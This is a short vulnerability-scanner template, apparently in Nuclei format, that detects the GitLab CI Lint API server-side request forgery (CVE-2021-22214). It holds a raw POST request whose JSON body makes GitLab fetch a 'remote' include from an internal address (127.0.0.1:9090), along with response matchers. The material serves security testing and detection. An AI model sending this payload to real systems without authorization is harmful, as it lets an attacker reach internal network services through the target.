id: gitlab-ci-lint-api-ssrf
info:
  name: Gitlab CI Lint API SSRF (CVE-2021-22214)
  author: ProjectDiscoveryAI
  severity: high
  description: |
    A server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 allows an unauthenticated attacker to exploit requests to internal networks via the CI Lint API.
  reference:
    - https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html
    - https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/
  tags: ssrf, gitlab
http:
  - raw:
      - |
        POST /api/v4/ci/lint HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"include_merged_yaml":true, "content":"include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml"}
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "merged_yaml"
        part: body
      - type: word
        words:
          - "500 Internal Server Error"
        part: body
